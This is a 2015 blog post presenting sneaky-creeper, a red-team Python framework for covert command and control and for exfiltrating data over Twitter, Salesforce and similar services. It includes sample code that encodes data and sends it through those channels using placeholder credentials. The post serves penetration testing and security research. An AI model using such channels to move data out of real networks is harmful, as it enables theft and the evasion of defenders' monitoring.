---
title:  "A Framework for Data Exfiltration"
date:   2015-09-08
author: Dakota Nelson
excerpt_separator: <!-- more -->
byline: "Introducing sneaky-creeper"
banner: glowing-bridge.jpg
share_text: "C2 framework presented at BSides Las Vegas called sneaky-creeper lets you exfiltrate data over social media! Get more info at https://strikersecurity.com/blog/sneaky-creeper-data-exfiltration-overview/"
tweet: "C2 framework called sneaky-creeper lets you exfiltrate data over social media! https://strikersecurity.com/blog/sneaky-creeper-data-exfiltration-overview/"
---

In August of 2015, I had the incredible opportunity to present alongside two others at BSides Las Vegas on command and control (C2) and data exfiltration (or infiltration) over publicly available cloud services.


The talk covered sneaky-creeper, a <a href="https://github.com/DakotaNelson/sneaky-creeper" target="_blank">framework for C2 and data exfiltration</a> I've been working on with a small group of contributors.


We present an overview of the framework, and briefly brush on future work, but I'd like to go further with this post into where the framework stands.

<!-- more -->

<div class="videoWrapper">
  <iframe src="https://www.youtube.com/embed/tLkQH-ev2iw" frameborder="0" allowfullscreen></iframe>
</div>


Before we begin, I want to thank John Strand for the original inspiration to pursue, in his words, "social media backdoors" - a tool for transferring illegitimate data over legitimate channels. I'd also like to thank the others who have worked on this framework - in no particular order, Byron Wasti, Bonnie Ishiguro, Nick Francisci, Davide Barbato, Gabriel Butterick, and Nora Mohamed. Seriously, check out <a href="https://github.com/DakotaNelson/sneaky-creeper/graphs/contributors" target="_blank">all the work they've done</a>.

<h3>Here's the problem</h3>

I see a gap in the array of security tools available to penetration testers and red team members. There are projects for exploitation and post-exploitation like nobody's business - from Metasploit to the Veil Framework to Powershell Empire, getting into a network and establishing a firm foothold is aided by a vast arsenal of excellent software.

When it comes to C2 and data exfiltration, however, options are limited. Metasploit provides HTTP/S and TCP connections, and tools like dnscat allow for tunneling over interesting protocols such as DNS and IMAP. While these tools are fantastic, anything more than a simple HTTP/S or TCP connection directly to a C2 server requires chaining multiple tools, which comes with its own configuration and headaches. Tools that go so far as to use publicly available services such as Twitter or GMail to hide their traffic (notably gcat) require their own custom implants - because of this, they don't see widespread use.


The lack of C2 capability might not be a problem if the status quo was significantly ahead of the defense (which, in all fairness, it currently is for most enterprises), but tactics and tools aimed at hard targets are shifting. A major example is Raphael Mudge's Cobalt Strike and its excellent <a href="http://www.advancedpentest.com/help-beacon" target="_blank">beacons</a>, which provide completely asynchronous command and control, allowing for a "low and slow" approach designed to drop attackers below the noise floor of a network. This is a capability I have yet to see extend much past commercial tools (with the notable exception of Powershell Empire from the Veris Group).


In short, I believe C2 is an increasingly difficult component of the offensive process with little tooling available. Existing open-source offensive tools suffer from a scarcity or complete absence of asynchronous techniques, especially novel ones. Projects which currently implement these techniques require extensive setup and lack automation, and, as far as I can tell, projects focused on testing a spectrum of C2 methods for a network simply don't exist.


<h3>So what are we doing about it?</h3>


<a href="https://github.com/DakotaNelson/sneaky-creeper" target="_blank">Sneaky-creeper</a> aims to fill as much of the tooling gap as possible. The framework is a python package which implements a management layer for small modules that provide encoding or transfer of data - known as encoders and channels, respectively. As much burden as possible is shifted away from people writing C2 modules and into the management layer, making new methods quickly iterable. It's designed to have an easy-to-use API and to be seamlessly integrated into any python program.

<center><img src="/images/sneaky-creeper-diagram.png" width="90%" alt="diagram of sneaky-creeper's functionality, showing the ability to link encoder modules and channel modules together to obfuscate then transport data across the internet"></center>

Sneaky-creeper reduces setup by providing a uniform interface to an array of C2 channels and techniques, and includes the concept of 'encoders', which allow for the munging of data in various ways before it's sent over the wire - all integrated, with no glue code required from the module developer. Several of the modules in the framework implement unusual techniques, such as using Twitter and Tumblr posts, or hiding data in music which is then uploaded to SoundCloud. Further development of techniques such as these is designed to be as easy as possible using the framework, which will, with luck, help increase innovation in C2 by preventing scaffolding work and reimplementations of the wheel.


For instance, this code will allow you to transfer over Twitter:

```python
from sneakers import Exfil

# channels actually move data
channel = "twitter"

# encoders let you encrypt/encode/mess with
# the data before you send it
encoders = ["b64"]
# note that they can be chained!

# contains the API keys and details for the
# account you'll post to
twitter_params = {
    "key": "xxxx",
    "secret": "xxxx",
    "token": "xxxx",
    "tsecret": "xxxx",
    "name": "twitter_account_name"
  }

data = "whatever you'd like"

feed = Exfil(channel, encoders)

feed.set_channel_params({
      "sending": twitter_params,
      "receiving": twitter_params
    })

feed.send(data)

print(feed.receive())
```

The real power of sneaky-creeper comes in when you want to change communications channels. Perhaps instead of using Twitter, as above, you'd like to move data over Salesforce, encrypted using AES.

```python
from sneakers import Exfil

# channels actually move data
channel = "salesforce"

# encoders let you encrypt/encode/mess with
# the data before you send it
encoders = ["aes"]
# note that they can be chained!

# contains the API keys and details for the
# account you'll post to
salesforce_params = {
    "username": "xxxx",
    "password": "xxxx",
    "client_id": "xxxx",
    "client_secret": "xxxx",
    "security_token": "xxxx"
  }

aes_params = { "key": "xxx" }

data = "whatever you'd like"

feed = Exfil(channel, encoders)

feed.set_channel_params({
      "sending": salesforce_params,
      "receiving": salesforce_params
    })

feed.set_encoder_params({
      "sending": aes_params,
      "receiving": aes_params
    })

feed.send(data)

print(feed.receive())
```

Notice that the only differences are in the parameters? The framework itself handles issues like packetization and reassembly of large amounts of data - you just put data in, and it comes out on the other side, with as little fuss as possible.


This is exciting, and we're continuing to work toward a robust and complete framework, but there's still much work left undone - and a lot more work we're deliberately ignoring.


<h3>There's still a long way to go...</h3>


Sneaky-creeper has a very particular philosophy: it's a library, not a standalone tool. Existing implants have thousands of hours of invested effort - trying to add another implant built around new C2 methods seems wasteful. Quite simply, we cannot compete. The hope is that other projects will be able to integrate sneaky-creeper and by doing so implement a standard interface for new C2 methods without very much developer time - not only to immediately access a variety of C2 methods, but also new ones developed in the future. Through specialization, we can achieve leverage for our efforts.


This vision still faces roadblocks. The work required to standardize C2, even to a small extent, among several projects - or even one project - is immense. The reason these implants are so valuable is stability, which requires rock-solid performance from every component. Sneaky-creeper is honestly not there yet - we still have failing tests - but all good things take time.


On top of code-level problems lie integration problems. Is python the right language? How do we reconcile a scripting language with implants written in lower-level code?


These questions still need answers - and we're always on the lookout for good ones. If you have any ideas, <a href="{{ "/contact/" | prepend: site.url }}">let us know</a>!
